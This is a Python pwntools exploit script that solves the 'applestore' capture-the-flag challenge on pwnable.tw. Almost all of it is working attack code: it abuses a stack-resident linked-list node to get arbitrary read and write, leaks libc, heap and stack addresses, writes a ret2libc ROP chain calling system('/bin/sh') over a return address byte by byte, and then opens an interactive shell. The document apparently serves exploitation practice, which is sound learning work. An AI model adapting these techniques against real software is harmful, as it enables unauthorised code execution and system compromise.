#!/usr/bin/env python3

# Challenge labels: Linked list control (read/write primitives), ret2libc
# Other solutions:
# - https://blog.srikavin.me/posts/pwnable-tw-applestore/ (Overwrite rbp to get write into exe.got.atoi)

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./applestore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

serv = "chall.pwnable.tw"
port = 10104

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *0x8048a15
            """)
    return r

r = conn()


def add_device_to_cart(device_id: int):
    sla(b'> ', b'2')
    sla(b'Device Number> ', enc(str(device_id)))

def arb_read(addr: int):
    # Uses the cart() function and our control of the string pointer in the stack device struct to leak addrs
    sla(b'> ', b'4')
    # We want to make sure that the fd pointer of the stack device struct is zeroed out
    sna(b'(y/n) > ', b'y\x00' + p32(addr) + p32(0x1) + p32(0x0))
    rcu(b'27: ')
    return u32(rcv(4))

def arb_write(addr: int, val: int):
    # Uses the delete() function to write val into addr
    # Side effect: addr is written into (val + 0xc)
    # Side effect: The string of the device struct is printed, so it needs to be a valid pointer. We set it to 0x8048e00
    sla(b'> ', b'3')
    sna(b'Item Number> ', b'27\x00' + p24(0x8048e) + p32(0x1) + p32(val) + p32(addr - 8))

def inject_payload(payload: bytes, addr: int):
    # Byte-by-byte injection using the LSB of 0x804beXX, from lower addresses to higher addresses (since little-endian)
    for i in range(len(payload)):
        arb_write(addr+i, 0x804be00+payload[i]) # 0x804be00 because of the side effect that the val must also be a writable addr

def main():
    # To get the total cost to be $7174, we need 9*$199 + 15*$299 + $399 + $499
    for _ in range(9): add_device_to_cart(1)
    for _ in range(15): add_device_to_cart(2)
    add_device_to_cart(3)
    add_device_to_cart(4)

    # Add the "iPhone 8" device struct using the checkout function which ends up on the stack instead of the heap
    # This will let us edit the device struct since our input is also written onto the stack in the same stack frame (since checkout() and add/delete/cart are all called by handler())
    sla(b'> ', b'5')
    sla(b'(y/n) > ', b'y')

    # We now have control of the contents of a device struct in the cart linked list, so we can use that to leak libc
    libc.address = arb_read(exe.got.malloc) - libc.sym.malloc
    log.info(f"{hex(libc.address)=}")

    # I originally wanted to use the delete function to overwrite the GOT entry of atoi with libc.sym.__libc_system
    # However, as this does a double write that sets fd+12 = bk and bk+8 = fd, both addr and value must be writable addrs
    # We could attempt to overwrite exe.got.atoi byte by byte from lower addresses upwards (i.e. only retain the LSB), but the issue is that atoi() 
    # is used in the delete() function and since we're using delete to get our write the program will segfault when the partial write is done
    
    # Instead, we have to do this byte-by-byte from lower addresses up the stack to overwrite the retaddr of handler()
    # We use the value 0x804beXX to write in the byte XX since it is a writable portion of the executable

    # To that end, we first need a stack leak, for that, we first need a heap leak
    heap_reference_to_stack = arb_read(0x0804b070) + 0x480
    log.info(f"{hex(heap_reference_to_stack)=}")

    # Now for the stack leak
    ret_addr_at = arb_read(heap_reference_to_stack) + 0x64
    log.info(f"{hex(ret_addr_at)=}")

    rop = ROP(libc)
    rop.system(next(libc.search(b"/bin/sh\x00")))
    inject_payload(rop.chain(), ret_addr_at)

    # Activate the ROP chain
    sla(b'> ', '6')

    r.interactive()


if __name__ == "__main__":
    main()
